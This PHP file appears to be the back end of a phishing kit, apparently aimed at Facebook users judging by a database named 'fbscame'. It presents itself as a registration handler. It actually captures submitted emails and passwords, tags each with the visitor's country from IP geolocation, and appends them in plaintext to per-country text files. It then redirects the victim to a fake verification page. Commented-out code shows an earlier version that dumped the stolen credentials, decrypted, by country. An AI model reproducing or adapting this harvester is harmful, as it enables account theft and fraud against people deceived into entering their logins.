<?php
session_start();
include('location.php');
include('encrypt.php');
// initializing variables
$username = "";
$email    = "";
//$errors = array(); 
$country="unknown";
// connect to the database
//$db = mysqli_connect('localhost', 'root', '', 'fbscame');

// REGISTER USER
if (isset($_POST['reg_user'])) {
  // receive all input values from the form
  $email = $_POST['email'];//mysqli_real_escape_string($db, $_POST['email']);
  $password = $_POST['password'];// mysqli_real_escape_string($db, $_POST['password']);
  $country=ip_info("Visitor", "Country");
  //$password=encrypt_decrypt('encrypt', $password);
 // $_POST['password']=$password;
	$file = fopen("data-".$country.".txt", 'a');
	fwrite($file,"email: " . $email. " - password: " . $password . "- country " . $country. "\r\n");
	fclose($file);
	/*$query = "INSERT INTO users (email, password,country) 
  	VALUES('$email', '$password','$country')";
  	mysqli_query($db, $query);-*/
  	$_SESSION['username'] = $username;
  	$_SESSION['success'] = "You are now logged in";
  	header('location: ../verification.php');

	
  // form validation: ensure that the form is correctly filled ...
  // by adding (array_push()) corresponding error unto $errors array
 /* if (empty($username)) { array_push($errors, "Username is required"); }
  if (empty($email)) { array_push($errors, "Email is required"); }
  if (empty($password_1)) { array_push($errors, "Password is required"); }
  if ($password_1 != $password_2) {
	array_push($errors, "The two passwords do not match");
  }
*/
  // first check the database to make sure 
  // a user does not already exist with the same username and/or email
  /*
  $user_check_query = "SELECT * FROM users WHERE username='$username' OR email='$email' LIMIT 1";
  $result = mysqli_query($db, $user_check_query);
  $user = mysqli_fetch_assoc($result);
  
  if ($user) { // if user exists
    if ($user['username'] === $username) {
      array_push($errors, "Username already exists");
    }

    if ($user['email'] === $email) {
      array_push($errors, "email already exists");
    }
  }*/

 /* // Finally, register user if there are no errors in the form
  if (count($errors) == 0) {
  	//$password = md5($password_1);//encrypt the password before saving in the database

  	$query = "INSERT INTO users (username, email, password) 
  			  VALUES('$username', '$email', '$password')";
  	mysqli_query($db, $query);
  	$_SESSION['username'] = $username;
  	$_SESSION['success'] = "You are now logged in";
  	header('location: index.php');
  }*/
}

// .../*
/*$countrysearch="";
$readedData="";
if(isset($_POST['read'])) {
	$countrysearch = mysqli_real_escape_string($db, $_POST['country']);
	
	$sql = "SELECT email, password, country FROM users";
	if(!empty($countrysearch)){
		$sql = "SELECT email, password, country FROM users WHERE country='$countrysearch'";
	}
	$result = mysqli_query($db, $sql);

	if ($result->num_rows > 0) {
  // output data of each row
  while($row = $result->fetch_assoc()) {
   $readedData.= "email: " . $row["email"]. " - password: " .encrypt_decrypt('decrypt', $row["password"]) . "- country " . $row["country"]. "\r\n";
  }
} else {
  echo "0 results";
}
} */